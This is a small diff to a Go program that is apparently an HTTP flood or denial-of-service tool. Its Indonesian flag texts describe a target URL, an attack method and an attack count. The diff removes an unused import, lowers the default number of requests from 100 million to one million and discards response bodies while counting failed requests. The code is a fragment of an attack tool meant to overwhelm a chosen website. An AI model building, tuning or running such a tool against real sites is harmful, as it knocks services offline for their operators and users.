@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bytes"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -21,7 +20,7 @@ var errorCount = 0
 func main() {
 	attackURL := flag.String("url", "", "URL target untuk serangan")
 	method := flag.String("method", "GET", "metode serangan (POST/GET)")
-	count := flag.Int("count", 100000000, "jumlah serangan")
+	count := flag.Int("count", 1000000, "jumlah serangan")
 	dataStr := flag.String("data", "", "data serangan")
 	flag.Parse()
 
@@ -72,7 +71,7 @@ func startAttack(attackURL string, method string, data url.Values) {
 	}
 	defer resp.Body.Close()
 
-	body, err := ioutil.ReadAll(resp.Body)
+	_, err = ioutil.ReadAll(resp.Body)
 	if err != nil || resp.StatusCode != http.StatusOK {
 		mu.Lock()
 		errorCount++
